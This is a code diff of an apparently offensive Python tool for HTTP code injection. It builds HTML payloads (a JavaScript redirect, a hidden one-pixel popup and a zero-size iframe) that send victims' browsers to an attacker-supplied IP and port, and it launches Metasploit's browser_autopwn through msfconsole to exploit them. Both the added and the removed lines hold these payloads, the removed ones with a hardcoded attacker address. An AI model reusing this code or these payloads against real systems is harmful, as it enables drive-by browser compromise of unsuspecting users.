@@ -20,20 +20,49 @@ ipaddress= conf[26].rstrip("\n")
 
 def main():
 
-   method = sys.argv[1]
-   payload = sys.argv[2]
+   try:
+      exploit = sys.argv[1]
+      payload = sys.argv[2]
+      ipaddress = sys.argv[3]
+      port = sys.argv[4]
+   except:
+      exploit = ""
+      payload = ""
 
       #Check Attack Method
-   if method == "metasploit":
-      buildattack(payload)
+   if exploit == "browser_autopwn":
+      buildattack(payload, ipaddress, port)
+      browser_autopwn()
          #Launch MSF Attack
       print "Serving up Metasploit..."
-      os.system("msfconsole -r " + str(os.path.dirname(os.path.abspath(__file__))) + '/httpcodeinjection.rc')
-   elif method == "custom":
+      os.system("xterm -e sh -c 'msfconsole -r " + str(os.path.dirname(os.path.abspath(__file__))) + "/httpcodeinjection.rc'")
+   elif exploit == "inject-ext-server":
+	   buildattack(payload, ipaddress, port)
+   elif exploit == "custom":
 	   print "Running Custom Injection..."
 	
 	
-def buildattack(payload):
+def buildattack(payload, ipaddress, port):
+   print "Building injection..."
+   
+   print "Using Payload " + payload
+   
+   if payload == "redir":
+         #WINDOW REDIRECTION ATTACK
+      with open(str(os.path.dirname(os.path.abspath(__file__))) + '/inject.x', 'w') as file:
+         file.writelines("<html><body><script type = 'text/javascript'>window.location = 'http://" + ipaddress + ":" + port + "'</script></body></html>")
+   
+   elif payload == "popup":
+         #WINDOW POPUP
+      with open(str(os.path.dirname(os.path.abspath(__file__))) + '/inject.x', 'w') as file:
+         file.writelines("<html><head><script type = 'text/javascript'>function pop() { mywindow = window.open('" + ipaddress + ":" + port + "', 'mywindow', 'location=0,status=0,scrolbars=0, width=1,height=1'); mywindow.moveTo(0, 0);}</script></head><body onmousover = 'javascript: pop()'></body></html>")
+   
+   elif payload == "frameinjection":
+         #IFRAME INJECTION ATTACK
+      with open(str(os.path.dirname(os.path.abspath(__file__))) + '/inject.x', 'w') as file:
+         file.writelines("<html><body><iframe width = '0' height = '0' src = 'http://" + ipaddress + ":" + port + "'/></body></html>")
+    
+def browser_autopwn():
 
    print "Using MSF Directory: " + msfdir
 
@@ -54,26 +83,6 @@ def buildattack(payload):
       file.writelines(exploit + lhost + uripath + uripath + srvport + "run")
       
    print "File Created!\n"
-   
-   print "Building injection..."
-   
-   print "Using Payload " + payload
-   
-   if payload == "redir":
-         #WINDOW REDIRECTION ATTACK
-      with open(str(os.path.dirname(os.path.abspath(__file__))) + '/inject.x', 'w') as file:
-         file.writelines("<html><body><script type = 'text/javascript'>window.location = 'http://" + ipaddress + ":8080'</script></body></html>")
-   
-   elif payload == "popup":
-         #WINDOW POPUP
-      with open(str(os.path.dirname(os.path.abspath(__file__))) + '/inject.x', 'w') as file:
-         file.writelines("<html><head><script type = 'text/javascript'>function pop() { mywindow = window.open('http://192.168.1.119:8080', 'mywindow', 'location=0,status=0,scrolbars=0, width=1,height=1'); mywindow.moveTo(0, 0);}</script></head><body onmousover = 'javascript: pop()'></body></html>")
-   
-   elif payload == "frameinjection":
-         #IFRAME INJECTION ATTACK
-      with open(str(os.path.dirname(os.path.abspath(__file__))) + '/inject.x', 'w') as file:
-         file.writelines("<html><body><iframe width = '0' height = '0' src = 'http://" + ipaddress + ":8080'/></body></html>")
-    
  
 if __name__ == '__main__':
     main()				
